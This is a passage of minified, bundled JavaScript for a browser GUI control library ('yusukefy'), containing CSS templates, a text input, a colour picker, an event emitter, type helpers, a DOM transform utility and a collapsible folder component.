                        var n = Object.freeze(Object.defineProperties(["\n\n.yusukefy-select-dropdown {\n    display: inline-block;\n    position: absolute;\n    width: calc(100% - ", ");\n    padding-left: 1.5%;\n    height: ", ";\n    border: none;\n    border-radius: 0;\n    -webkit-appearance: none;\n    -moz-appearance: none;\n    -o-appearance:none;\n    appearance: none;\n    font-family: inherit;\n    background-color: ", ";\n    color: ", ";\n    box-sizing: border-box !important;\n    -moz-box-sizing: border-box !important;\n    -webkit-box-sizing: border-box !important;\n}\n\n/* Disable default outline since we're providing our own */\n.yusukefy-select-dropdown:focus {\n    outline: none;\n}\n.yusukefy-select-dropdown::-moz-focus-inner {\n    border: 0;\n}\n\n\n.yusukefy-select-dropdown:focus,\n.yusukefy-select-dropdown:hover {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-select-dropdown::-ms-expand {\n    display:none;\n}\n.yusukefy-select-triangle {\n    content: ' ';\n    border-right: 3px solid transparent;\n    border-left: 3px solid transparent;\n    line-height: ", ";\n    position: absolute;\n    right: 2.5%;\n    z-index: 1;\n    pointer-events: none;\n}\n\n.yusukefy-select-triangle--up {\n    bottom: 55%;\n    border-bottom: 5px solid ", ";\n    border-top: 0px transparent;\n}\n\n.yusukefy-select-triangle--down {\n    top: 55%;\n    border-top: 5px solid ", ";\n    border-bottom: 0px transparent;\n}\n\n.yusukefy-select-triangle--up-highlight {\n    border-bottom-color: ", ";\n}\n\n.yusukefy-select-triangle--down-highlight {\n    border-top-color: ", ";\n}\n\n"], {
                            raw: {
                                value: Object.freeze(["\n\n.yusukefy-select-dropdown {\n    display: inline-block;\n    position: absolute;\n    width: calc(100% - ", ");\n    padding-left: 1.5%;\n    height: ", ";\n    border: none;\n    border-radius: 0;\n    -webkit-appearance: none;\n    -moz-appearance: none;\n    -o-appearance:none;\n    appearance: none;\n    font-family: inherit;\n    background-color: ", ";\n    color: ", ";\n    box-sizing: border-box !important;\n    -moz-box-sizing: border-box !important;\n    -webkit-box-sizing: border-box !important;\n}\n\n/* Disable default outline since we're providing our own */\n.yusukefy-select-dropdown:focus {\n    outline: none;\n}\n.yusukefy-select-dropdown::-moz-focus-inner {\n    border: 0;\n}\n\n\n.yusukefy-select-dropdown:focus,\n.yusukefy-select-dropdown:hover {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-select-dropdown::-ms-expand {\n    display:none;\n}\n.yusukefy-select-triangle {\n    content: ' ';\n    border-right: 3px solid transparent;\n    border-left: 3px solid transparent;\n    line-height: ", ";\n    position: absolute;\n    right: 2.5%;\n    z-index: 1;\n    pointer-events: none;\n}\n\n.yusukefy-select-triangle--up {\n    bottom: 55%;\n    border-bottom: 5px solid ", ";\n    border-top: 0px transparent;\n}\n\n.yusukefy-select-triangle--down {\n    top: 55%;\n    border-top: 5px solid ", ";\n    border-bottom: 0px transparent;\n}\n\n.yusukefy-select-triangle--up-highlight {\n    border-bottom-color: ", ";\n}\n\n.yusukefy-select-triangle--down-highlight {\n    border-top-color: ", ";\n}\n\n"])
                            }
                        }))
                            , r = i(1)
                            , i = i(3);
                        e.exports = i(n, r.theme.sizing.labelWidth, r.theme.sizing.componentHeight, r.theme.colors.componentBackground, r.theme.colors.textSecondary, r.theme.colors.textHover, r.theme.colors.componentForeground, r.theme.sizing.componentHeight, r.theme.colors.textSecondary, r.theme.colors.textSecondary, r.theme.colors.textHover, r.theme.colors.textHover)
                    }
                    , function (e, t, a) {
                        "use strict";
                        function i(e) {
                            return e && e.__esModule ? e : {
                                default: e
                            }
                        }
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var n = function (e, t, i) {
                            return t && o(e.prototype, t),
                                i && o(e, i),
                                e
                        }
                            , r = i(a(4))
                            , s = i(a(0))
                            , r = function (e) {
                                function o(e, t, i, n) {
                                    var r;
                                    if (this instanceof o)
                                        return (r = function (e, t) {
                                            if (e)
                                                return !t || "object" != typeof t && "function" != typeof t ? e : t;
                                            throw new ReferenceError("this hasn't been initialised - super() hasn't been called")
                                        }(this, (o.__proto__ || Object.getPrototypeOf(o)).call(this))).opts = t,
                                            r.container = a(2)(e, t.label, i),
                                            a(5)(r.container, t.label, i),
                                            r.input = r.container.appendChild(document.createElement("input")),
                                            r.input.type = "text",
                                            r.input.className = "yusukefy-text",
                                            t.initial && (r.input.value = t.initial),
                                            t.label && r.input.setAttribute("aria-label", t.label),
                                            (0,
                                                s.default)(r.input, {
                                                    position: "absolute",
                                                    paddingLeft: "6px",
                                                    height: i.sizing.componentHeight,
                                                    width: "calc(100% - " + i.sizing.labelWidth + ")",
                                                    border: "none",
                                                    background: i.colors.componentBackground,
                                                    color: i.colors.textSecondary,
                                                    fontFamily: "inherit",
                                                    "box-sizing": "border-box",
                                                    "-moz-box-sizing": "border-box",
                                                    "-webkit-box-sizing": "border-box",
                                                    resize: "vertical"
                                                }),
                                            setTimeout(function () {
                                                r.emit("initialized", r.input.value)
                                            }),
                                            r.input.oninput = function (e) {
                                                r.emit("input", e.target.value)
                                            }
                                            ,
                                            r.input.addEventListener("focus", function () {
                                                (0,
                                                    s.default)(r.input, {
                                                        outline: "none"
                                                    }),
                                                    r.focused = !0
                                            }),
                                            r.input.addEventListener("blur", function () {
                                                r.focused = !1
                                            }),
                                            r;
                                    throw new TypeError("Cannot call a class as a function")
                                }
                                var t = o;
                                if ("function" != typeof e && null !== e)
                                    throw new TypeError("Super expression must either be null or a function, not " + typeof e);
                                return t.prototype = Object.create(e && e.prototype, {
                                    constructor: {
                                        value: t,
                                        enumerable: !1,
                                        writable: !0,
                                        configurable: !0
                                    }
                                }),
                                    e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e),
                                    n(o, [{
                                        key: "SetValue",
                                        value: function (e) {
                                            !0 !== this.focused && (this.input.value = e)
                                        }
                                    }, {
                                        key: "GetValue",
                                        value: function () {
                                            return this.input.value
                                        }
                                    }]),
                                    o
                            }(r.default);
                        function o(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        t.default = r,
                            e.exports = t.default
                    }
                    , function (e, t, E) {
                        "use strict";
                        function i(e) {
                            return e && e.__esModule ? e : {
                                default: e
                            }
                        }
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var n = function (e, t, i) {
                            return t && a(e.prototype, t),
                                i && a(e, i),
                                e
                        }
                            , r = i(E(4))
                            , u = i(E(54))
                            , d = i(E(0))
                            , T = i(E(14))
                            , o = i(E(13))
                            , r = function (e) {
                                function _(e, t, i, n) {
                                    if (!(this instanceof _))
                                        throw new TypeError("Cannot call a class as a function");
                                    var r = function (e, t) {
                                        if (e)
                                            return !t || "object" != typeof t && "function" != typeof t ? e : t;
                                        throw new ReferenceError("this hasn't been initialised - super() hasn't been called")
                                    }(this, (_.__proto__ || Object.getPrototypeOf(_)).call(this))
                                        , o = (r.opts = t,
                                            r.theme = i,
                                            t.format = t.format || "rgb",
                                            t.initial = t.initial || "#123456",
                                            r.container = E(2)(e, t.label, i),
                                            E(5)(r.container, t.label, i),
                                            r.container.appendChild(document.createElement("span")))
                                        , a = (o.className = "yusukefy-color-" + n,
                                            E(6)(r.container, "", i, "calc(100% - " + i.sizing.labelWidth + " - 12% - 0.5em)"))
                                        , s = (a.setAttribute("readonly", "true"),
                                            o.onmouseover = function () {
                                                r.picker.$el.style.display = ""
                                            }
                                            ,
                                            t.initial);
                                    switch (t.format) {
                                        case "rgb":
                                        case "hex":
                                            s = (0,
                                                T.default)(s).toHexString();
                                            break;
                                        case "array":
                                            s = T.default.fromRatio({
                                                r: s[0],
                                                g: s[1],
                                                b: s[2]
                                            }).toHexString()
                                    }
                                    return r.picker = new u.default({
                                        el: o,
                                        color: s,
                                        background: i.colors.componentBackground,
                                        width: 125,
                                        height: 100
                                    }),
                                        (0,
                                            d.default)(r.picker.$el, {
                                                marginTop: i.sizing.componentHeight,
                                                display: "none",
                                                position: "absolute"
                                            }),
                                        (0,
                                            d.default)(o, {
                                                position: "relative",
                                                display: "inline-block",
                                                width: "12.5%",
                                                height: i.sizing.componentHeight,
                                                backgroundColor: r.picker.getHexString()
                                            }),
                                        r.InjectStyles(),
                                        o.onmouseout = function (e) {
                                            r.picker.$el.style.display = "none"
                                        }
                                        ,
                                        setTimeout(function () {
                                            r.emit("initialized", s)
                                        }),
                                        r.picker.onChange(function (e) {
                                            a.value = r.Format(e),
                                                (0,
                                                    d.default)(o, {
                                                        backgroundColor: e
                                                    }),
                                                r.emit("input", r.Format(e))
                                        }),
                                        r
                                }
                                var t = _;
                                if ("function" != typeof e && null !== e)
                                    throw new TypeError("Super expression must either be null or a function, not " + typeof e);
                                return t.prototype = Object.create(e && e.prototype, {
                                    constructor: {
                                        value: t,
                                        enumerable: !1,
                                        writable: !0,
                                        configurable: !0
                                    }
                                }),
                                    e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e),
                                    n(_, [{
                                        key: "Format",
                                        value: function (e) {
                                            switch (this.opts.format) {
                                                case "rgb":
                                                    return (0,
                                                        T.default)(e).toRgbString();
                                                case "hex":
                                                    return (0,
                                                        T.default)(e).toHexString();
                                                case "array":
                                                    var t = (0,
                                                        T.default)(e).toRgb();
                                                    return [t.r / 255, t.g / 255, t.b / 255].map(function (e) {
                                                        return e.toFixed(2)
                                                    });
                                                default:
                                                    return e
                                            }
                                        }
                                    }, {
                                        key: "SetValue",
                                        value: function (e) {
                                            this.picker.setColor(e)
                                        }
                                    }, {
                                        key: "GetValue",
                                        value: function () {
                                            return this.Format(this.picker.getColor())
                                        }
                                    }, {
                                        key: "InjectStyles",
                                        value: function () {
                                            (0,
                                                o.default)("\n\n        .Scp {\n            width: 125px;\n            height: 100px;\n            -webkit-user-select: none;\n            -moz-user-select: none;\n                -ms-user-select: none;\n                    user-select: none;\n            position: relative;\n            z-index: 1000;\n            cursor: pointer;\n        }\n        .Scp-saturation {\n            position: relative;\n            width: calc(100% - 25px);\n            height: 100%;\n            background: linear-gradient(to right, #fff 0%, #f00 100%);\n            float: left;\n            margin-right: 5px;\n        }\n        .Scp-brightness {\n            width: 100%;\n            height: 100%;\n            background: linear-gradient(to top, #000 0%, rgba(255,255,255,0) 100%);\n        }\n        .Scp-sbSelector {\n            border: 1px solid;\n            position: absolute;\n            width: 14px;\n            height: 14px;\n            background: #fff;\n            border-radius: 10px;\n            top: -7px;\n            left: -7px;\n            box-sizing: border-box;\n            z-index: 10;\n        }\n        .Scp-hue {\n            width: 20px;\n            height: 100%;\n            position: relative;\n            float: left;\n            background: linear-gradient(to bottom, #f00 0%, #f0f 17%, #00f 34%, #0ff 50%, #0f0 67%, #ff0 84%, #f00 100%);\n        }\n        .Scp-hSelector {\n            position: absolute;\n            background: #fff;\n            border-bottom: 1px solid #000;\n            right: -3px;\n            width: 10px;\n            height: 2px;\n        }\n\n        ")
                                        }
                                    }]),
                                    _
                            }(r.default);
                        function a(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        t.default = r,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        function n(e) {
                            return e = e || {},
                                this.color = null,
                                this.width = 0,
                                this.widthUnits = "px",
                                this.height = 0,
                                this.heightUnits = "px",
                                this.hue = 0,
                                this.position = {
                                    x: 0,
                                    y: 0
                                },
                                this.huePosition = 0,
                                this.saturationWidth = 0,
                                this.hueHeight = 0,
                                this.maxHue = 0,
                                this.inputIsNumber = !1,
                                this._onSaturationMouseDown = this._onSaturationMouseDown.bind(this),
                                this._onSaturationMouseMove = this._onSaturationMouseMove.bind(this),
                                this._onSaturationMouseUp = this._onSaturationMouseUp.bind(this),
                                this._onHueMouseDown = this._onHueMouseDown.bind(this),
                                this._onHueMouseMove = this._onHueMouseMove.bind(this),
                                this._onHueMouseUp = this._onHueMouseUp.bind(this),
                                this.$el = document.createElement("div"),
                                this.$el.className = "Scp",
                                this.$el.innerHTML = ['<div class="Scp-saturation">', '<div class="Scp-brightness"></div>', '<div class="Scp-sbSelector"></div>', "</div>", '<div class="Scp-hue">', '<div class="Scp-hSelector"></div>', "</div>"].join(""),
                                this.$saturation = this.$el.querySelector(".Scp-saturation"),
                                this.$hue = this.$el.querySelector(".Scp-hue"),
                                this.$sbSelector = this.$el.querySelector(".Scp-sbSelector"),
                                this.$hSelector = this.$el.querySelector(".Scp-hSelector"),
                                this.$saturation.addEventListener("mousedown", this._onSaturationMouseDown),
                                this.$saturation.addEventListener("touchstart", this._onSaturationMouseDown),
                                this.$hue.addEventListener("mousedown", this._onHueMouseDown),
                                this.$hue.addEventListener("touchstart", this._onHueMouseDown),
                                e.el && this.appendTo(e.el),
                                e.background && this.setBackgroundColor(e.background),
                                e.widthUnits && (this.widthUnits = e.widthUnits),
                                e.heightUnits && (this.heightUnits = e.heightUnits),
                                this.setSize(e.width || 175, e.height || 150),
                                this.setColor(e.color),
                                this
                        }
                        function r(e, t, i) {
                            return Math.min(Math.max(e, t), i)
                        }
                        function o(e) {
                            return {
                                x: (e = 0 === e.type.indexOf("touch") ? e.touches[0] : e).clientX,
                                y: e.clientY
                            }
                        }
                        function a(e) {
                            return "#" + ("00000" + (0 | e).toString(16)).substr(-6)
                        }
                        var s, _, E, u;
                        s = i(55),
                            _ = i(56),
                            E = i(14),
                            u = i(59),
                            s(n.prototype),
                            n.prototype.appendTo = function (e) {
                                return e.appendChild(this.$el),
                                    this
                            }
                            ,
                            n.prototype.remove = function () {
                                this._onSaturationMouseUp(),
                                    this._onHueMouseUp(),
                                    this.$saturation.removeEventListener("mousedown", this._onSaturationMouseDown),
                                    this.$saturation.removeEventListener("touchstart", this._onSaturationMouseDown),
                                    this.$hue.removeEventListener("mousedown", this._onHueMouseDown),
                                    this.$hue.removeEventListener("touchstart", this._onHueMouseDown),
                                    this.off(),
                                    this.$el.parentNode && this.$el.parentNode.removeChild(this.$el)
                            }
                            ,
                            n.prototype.setColor = function (e) {
                                _(e) ? (this.inputIsNumber = !0,
                                    e = a(e)) : this.inputIsNumber = !1,
                                    this.color = E(e);
                                e = this.color.toHsv();
                                return isNaN(e.h) || (this.hue = e.h),
                                    this._moveSelectorTo(this.saturationWidth * e.s, (1 - e.v) * this.hueHeight),
                                    this._moveHueTo((1 - this.hue / 360) * this.hueHeight),
                                    this._updateHue(),
                                    this
                            }
                            ,
                            n.prototype.setSize = function (e, t) {
                                return this.width = e,
                                    this.height = t,
                                    this.$el.style.width = this.width + this.widthUnits,
                                    this.$el.style.height = this.height + this.heightUnits,
                                    this.saturationWidth = this.width - 25,
                                    this.$saturation.style.width = this.saturationWidth + "px",
                                    this.hueHeight = this.height,
                                    this.maxHue = this.hueHeight - 2,
                                    this
                            }
                            ,
                            n.prototype.setBackgroundColor = function (e) {
                                return _(e) && (e = a(e)),
                                    this.$el.style.padding = "5px",
                                    this.$el.style.background = E(e).toHexString(),
                                    this
                            }
                            ,
                            n.prototype.setNoBackground = function () {
                                this.$el.style.padding = "0px",
                                    this.$el.style.background = "none"
                            }
                            ,
                            n.prototype.onChange = function (e) {
                                return this.on("update", e),
                                    this.emit("update", this.getHexString()),
                                    this
                            }
                            ,
                            n.prototype.getColor = function () {
                                return this.inputIsNumber ? this.getHexNumber() : this.color.toString()
                            }
                            ,
                            n.prototype.getHexString = function () {
                                return this.color.toHexString().toUpperCase()
                            }
                            ,
                            n.prototype.getHexNumber = function () {
                                return parseInt(this.color.toHex(), 16)
                            }
                            ,
                            n.prototype.getRGB = function () {
                                return this.color.toRgb()
                            }
                            ,
                            n.prototype.getHSV = function () {
                                return this.color.toHsv()
                            }
                            ,
                            n.prototype.isDark = function () {
                                return this.color.isDark()
                            }
                            ,
                            n.prototype.isLight = function () {
                                return this.color.isLight()
                            }
                            ,
                            n.prototype._moveSelectorTo = function (e, t) {
                                this.position.x = r(e, 0, this.saturationWidth),
                                    this.position.y = r(t, 0, this.hueHeight),
                                    u(this.$sbSelector, {
                                        x: this.position.x,
                                        y: this.position.y
                                    })
                            }
                            ,
                            n.prototype._updateColorFromPosition = function () {
                                this.color = E({
                                    h: this.hue,
                                    s: this.position.x / this.saturationWidth,
                                    v: 1 - this.position.y / this.hueHeight
                                }),
                                    this._updateColor()
                            }
                            ,
                            n.prototype._moveHueTo = function (e) {
                                this.huePosition = r(e, 0, this.maxHue),
                                    u(this.$hSelector, {
                                        y: this.huePosition
                                    })
                            }
                            ,
                            n.prototype._updateHueFromPosition = function () {
                                var e = this.color.toHsv();
                                this.hue = 360 * (1 - this.huePosition / this.maxHue),
                                    this.color = E({
                                        h: this.hue,
                                        s: e.s,
                                        v: e.v
                                    }),
                                    this._updateHue()
                            }
                            ,
                            n.prototype._updateHue = function () {
                                var e = E({
                                    h: this.hue,
                                    s: 1,
                                    v: 1
                                });
                                this.$saturation.style.background = "linear-gradient(to right, #fff, " + e.toHexString() + ")",
                                    this._updateColor()
                            }
                            ,
                            n.prototype._updateColor = function () {
                                this.$sbSelector.style.background = this.color.toHexString(),
                                    this.$sbSelector.style.borderColor = this.color.isDark() ? "#fff" : "#000",
                                    this.emit("update", this.color.toHexString())
                            }
                            ,
                            n.prototype._onSaturationMouseDown = function (e) {
                                var t = this.$saturation.getBoundingClientRect()
                                    , i = o(e).x
                                    , n = o(e).y;
                                this._moveSelectorTo(i - t.left, n - t.top),
                                    this._updateColorFromPosition(),
                                    window.addEventListener("mouseup", this._onSaturationMouseUp),
                                    window.addEventListener("touchend", this._onSaturationMouseUp),
                                    window.addEventListener("mousemove", this._onSaturationMouseMove),
                                    window.addEventListener("touchmove", this._onSaturationMouseMove),
                                    e.preventDefault()
                            }
                            ,
                            n.prototype._onSaturationMouseMove = function (e) {
                                var t = this.$saturation.getBoundingClientRect()
                                    , i = o(e).x
                                    , e = o(e).y;
                                this._moveSelectorTo(i - t.left, e - t.top),
                                    this._updateColorFromPosition()
                            }
                            ,
                            n.prototype._onSaturationMouseUp = function () {
                                window.removeEventListener("mouseup", this._onSaturationMouseUp),
                                    window.removeEventListener("touchend", this._onSaturationMouseUp),
                                    window.removeEventListener("mousemove", this._onSaturationMouseMove),
                                    window.removeEventListener("touchmove", this._onSaturationMouseMove)
                            }
                            ,
                            n.prototype._onHueMouseDown = function (e) {
                                var t = this.$hue.getBoundingClientRect()
                                    , i = o(e).y;
                                this._moveHueTo(i - t.top),
                                    this._updateHueFromPosition(),
                                    window.addEventListener("mouseup", this._onHueMouseUp),
                                    window.addEventListener("touchend", this._onHueMouseUp),
                                    window.addEventListener("mousemove", this._onHueMouseMove),
                                    window.addEventListener("touchmove", this._onHueMouseMove),
                                    e.preventDefault()
                            }
                            ,
                            n.prototype._onHueMouseMove = function (e) {
                                var t = this.$hue.getBoundingClientRect()
                                    , e = o(e).y;
                                this._moveHueTo(e - t.top),
                                    this._updateHueFromPosition()
                            }
                            ,
                            n.prototype._onHueMouseUp = function () {
                                window.removeEventListener("mouseup", this._onHueMouseUp),
                                    window.removeEventListener("touchend", this._onHueMouseUp),
                                    window.removeEventListener("mousemove", this._onHueMouseMove),
                                    window.removeEventListener("touchmove", this._onHueMouseMove)
                            }
                            ,
                            void 0 !== e && e.exports && (e.exports = n)
                    }
                    , function (e, t, i) {
                        function n(e) {
                            if (e) {
                                var t, i = e;
                                for (t in n.prototype)
                                    i[t] = n.prototype[t];
                                return i
                            }
                        }
                        (e.exports = n).prototype.on = n.prototype.addEventListener = function (e, t) {
                            return this._callbacks = this._callbacks || {},
                                (this._callbacks["$" + e] = this._callbacks["$" + e] || []).push(t),
                                this
                        }
                            ,
                            n.prototype.once = function (e, t) {
                                function i() {
                                    this.off(e, i),
                                        t.apply(this, arguments)
                                }
                                return i.fn = t,
                                    this.on(e, i),
                                    this
                            }
                            ,
                            n.prototype.off = n.prototype.removeListener = n.prototype.removeAllListeners = n.prototype.removeEventListener = function (e, t) {
                                if (this._callbacks = this._callbacks || {},
                                    0 == arguments.length)
                                    this._callbacks = {};
                                else {
                                    var i = this._callbacks["$" + e];
                                    if (i)
                                        if (1 == arguments.length)
                                            delete this._callbacks["$" + e];
                                        else
                                            for (var n, r = 0; r < i.length; r++)
                                                if ((n = i[r]) === t || n.fn === t) {
                                                    i.splice(r, 1);
                                                    break
                                                }
                                }
                                return this
                            }
                            ,
                            n.prototype.emit = function (e) {
                                this._callbacks = this._callbacks || {};
                                var t = [].slice.call(arguments, 1)
                                    , i = this._callbacks["$" + e];
                                if (i)
                                    for (var n = 0, r = (i = i.slice(0)).length; n < r; ++n)
                                        i[n].apply(this, t);
                                return this
                            }
                            ,
                            n.prototype.listeners = function (e) {
                                return this._callbacks = this._callbacks || {},
                                    this._callbacks["$" + e] || []
                            }
                            ,
                            n.prototype.hasListeners = function (e) {
                                return !!this.listeners(e).length
                            }
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = i(57);
                        e.exports = function (e) {
                            var t = n(e);
                            if ("string" === t) {
                                if (!e.trim())
                                    return !1
                            } else if ("number" !== t)
                                return !1;
                            return 0 <= e - e + 1
                        }
                    }
                    , function (e, t, i) {
                        var n = i(58)
                            , r = Object.prototype.toString;
                        e.exports = function (e) {
                            var t;
                            return void 0 === e ? "undefined" : null === e ? "null" : !0 === e || !1 === e || e instanceof Boolean ? "boolean" : "string" == typeof e || e instanceof String ? "string" : "number" == typeof e || e instanceof Number ? "number" : "function" == typeof e || e instanceof Function ? "function" : void 0 !== Array.isArray && Array.isArray(e) ? "array" : e instanceof RegExp ? "regexp" : e instanceof Date ? "date" : "[object RegExp]" === (t = r.call(e)) ? "regexp" : "[object Date]" === t ? "date" : "[object Arguments]" === t ? "arguments" : "[object Error]" === t ? "error" : n(e) ? "buffer" : "[object Set]" === t ? "set" : "[object WeakSet]" === t ? "weakset" : "[object Map]" === t ? "map" : "[object WeakMap]" === t ? "weakmap" : "[object Symbol]" === t ? "symbol" : "[object Int8Array]" === t ? "int8array" : "[object Uint8Array]" === t ? "uint8array" : "[object Uint8ClampedArray]" === t ? "uint8clampedarray" : "[object Int16Array]" === t ? "int16array" : "[object Uint16Array]" === t ? "uint16array" : "[object Int32Array]" === t ? "int32array" : "[object Uint32Array]" === t ? "uint32array" : "[object Float32Array]" === t ? "float32array" : "[object Float64Array]" === t ? "float64array" : "object"
                        }
                    }
                    , function (e, t) {
                        function i(e) {
                            return !!e.constructor && "function" == typeof e.constructor.isBuffer && e.constructor.isBuffer(e)
                        }
                        e.exports = function (e) {
                            return null != e && (i(e) || "function" == typeof (t = e).readFloatLE && "function" == typeof t.slice && i(t.slice(0, 0)) || !!e._isBuffer);
                            var t
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        function r() {
                            return Object.keys(u).map(function (e) {
                                return e
                            })
                        }
                        var _ = i(60)
                            , E = i(61)
                            , u = i(62)
                            , d = i(63)
                            , T = Object.prototype.hasOwnProperty
                            , A = _("transform")
                            , h = {
                                x: "translateX",
                                y: "translateY",
                                z: "translateZ",
                                origin: "transformOrigin"
                            };
                        (t = e.exports = function (e, t) {
                            var i, n, r, o, a = [], s = t;
                            for (o in s)
                                T.call(h, o) && (s[h[o]] = s[o],
                                    delete s[o]);
                            for (i in t)
                                T.call(t, i) && (n = t[i],
                                    T.call(u.transform, i) ? (r = u.transform[i],
                                        E(n) && (n = n.join(r.separator)),
                                        a.push(i + "(" + d(n, r.defaultUnit, r.separator) + ")")) : T.call(u, i) ? (r = u[i],
                                            E(n) && (n = n.join(r.separator)),
                                            e.style[_(i)] = d(n, r.defaultUnit, r.separator)) : console.warn("dom-transform: this property (`" + i + "`) is not supported."));
                            e.style[A] = a.join(" ")
                        }
                        ).get = function (e, t) {
                            var i = e.style;
                            if ("string" == typeof t)
                                return T.call(u.transform, t) ? i[A] : i[_(t)];
                            t = t || r();
                            var n = {};
                            return t.forEach(function (e) {
                                n[e] = i[_(e)]
                            }),
                                n
                        }
                            ,
                            t.reset = function (e, t) {
                                var i = e.style;
                                "string" == typeof t ? i[_(t)] = null : (t = t || r()).forEach(function (e) {
                                    i[_(e)] = null
                                })
                            }
                            ,
                            t.isSupported = function () {
                                return 0 < A.length
                            }
                    }
                    , function (e, t) {
                        function i(e) {
                            if (e = e.replace(/-([a-z])/g, function (e, t) {
                                return t.toUpperCase()
                            }),
                                void 0 === r[e])
                                for (var t = e.charAt(0).toUpperCase() + e.slice(1), i = o.length; i--;) {
                                    var n = o[i] + t;
                                    if (void 0 !== r[n])
                                        return n
                                }
                            return e
                        }
                        var r = "undefined" != typeof document ? document.createElement("p").style : {}
                            , o = ["O", "ms", "Moz", "Webkit"]
                            , n = /([A-Z])/g
                            , a = {};
                        e.exports = function (e) {
                            return e in a ? a[e] : a[e] = i(e)
                        }
                            ,
                            e.exports.dash = function (e) {
                                return e = i(e),
                                    n.test(e) && (e = "-" + e.replace(n, "-$1"),
                                        n.lastIndex = 0),
                                    e.toLowerCase()
                            }
                    }
                    , function (e, t) {
                        var i = Array.isArray
                            , n = Object.prototype.toString;
                        e.exports = i || function (e) {
                            return !!e && "[object Array]" == n.call(e)
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        e.exports = {
                            transform: {
                                translate: {
                                    defaultUnit: "px"
                                },
                                translate3d: {
                                    defaultUnit: "px"
                                },
                                translateX: {
                                    defaultUnit: "px"
                                },
                                translateY: {
                                    defaultUnit: "px"
                                },
                                translateZ: {
                                    defaultUnit: "px"
                                },
                                scale: {
                                    defaultUnit: ""
                                },
                                scale3d: {
                                    defaultUnit: ""
                                },
                                scaleX: {
                                    defaultUnit: ""
                                },
                                scaleY: {
                                    defaultUnit: ""
                                },
                                scaleZ: {
                                    defaultUnit: ""
                                },
                                rotate: {
                                    defaultUnit: "deg"
                                },
                                rotate3d: {
                                    defaultUnit: ""
                                },
                                rotateX: {
                                    defaultUnit: "deg"
                                },
                                rotateY: {
                                    defaultUnit: "deg"
                                },
                                rotateZ: {
                                    defaultUnit: "deg"
                                },
                                skew: {
                                    defaultUnit: "deg"
                                },
                                skewX: {
                                    defaultUnit: "deg"
                                },
                                skewY: {
                                    defaultUnit: "deg"
                                },
                                perspective: {
                                    defaultUnit: "px"
                                },
                                matrix: {
                                    defaultUnit: ""
                                },
                                matrix3d: {
                                    defaultUnit: ""
                                }
                            },
                            transformOrigin: {
                                defaultUnit: "px",
                                separator: " "
                            }
                        }
                    }
                    , function (e, t, i) {
                        "use strict";
                        var r = i(64)
                            , o = /^-?\d+(\.\d+)?$/;
                        e.exports = function (e, t, i) {
                            var n;
                            return i = i || ",",
                                "number" == typeof e ? "" + e + t : (n = new RegExp(i, "g"),
                                    e.split(n.test(e) ? i : " ").map(function (e) {
                                        return e = r(e),
                                            o.test(e) && (e += t),
                                            e
                                    }).join(i))
                        }
                    }
                    , function (e, t) {
                        (t = e.exports = function (e) {
                            return e.replace(/^\s*|\s*$/g, "")
                        }
                        ).left = function (e) {
                            return e.replace(/^\s*/, "")
                        }
                            ,
                            t.right = function (e) {
                                return e.replace(/\s*$/, "")
                            }
                    }
                    , function (e, t, o) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var i = function (e, t, i) {
                            return t && r(e.prototype, t),
                                i && r(e, i),
                                e
                        }
                            , n = o(0)
                            , a = n && n.__esModule ? n : {
                                default: n
                            }
                            , s = o(66);
                        function _(e, t, i, n) {
                            var r = this;
                            if (!(this instanceof _))
                                throw new TypeError("Cannot call a class as a function");
                            this.opts = t,
                                this.container = o(2)(e, t.label, i),
                                this.container.classList.add(s["yusukefy-folder"]),
                                this.container.setAttribute("role", "button"),
                                this.container.setAttribute("tabIndex", "0"),
                                this.arrow = this.container.appendChild(document.createElement("div")),
                                this.arrow.innerHTML = "&#9662;",
                                (0,
                                    a.default)(this.arrow, {
                                        width: "1.5em"
                                    }),
                                this.label = this.container.appendChild(document.createElement("div")),
                                this.label.innerHTML = t.label,
                                this.container.onclick = function () {
                                    r.Toggle()
                                }
                                ,
                                this.container.addEventListener("mouseup", function () {
                                    r.container.blur()
                                }),
                                this.container.addEventListener("keydown", function (e) {
                                    13 !== e.which && 32 !== e.which || r.Toggle()
                                }),
                                this.folderContainer = e.appendChild(document.createElement("div")),
                                this.folderContainer.classList.add(s["yusukefy-folder-contents"]),
                                this.open = this.opts.open || !1,
                                this.SetOpen(this.open)
                        }
                        function r(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        i(_, [{
                            key: "Toggle",
                            value: function () {
                                this.open = !this.open,
                                    this.SetOpen(this.open)
                            }
                        }, {
                            key: "SetOpen",
                            value: function (e) {
                                (this.open = e) ? (this.folderContainer.classList.remove(s["yusukefy-folder-closed"]),
                                    this.arrow.innerHTML = "&#9662;") : (this.folderContainer.classList.add(s["yusukefy-folder-closed"]),
                                        this.arrow.innerHTML = "&#9656;")
                            }
                        }]),
                            t.default = _,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
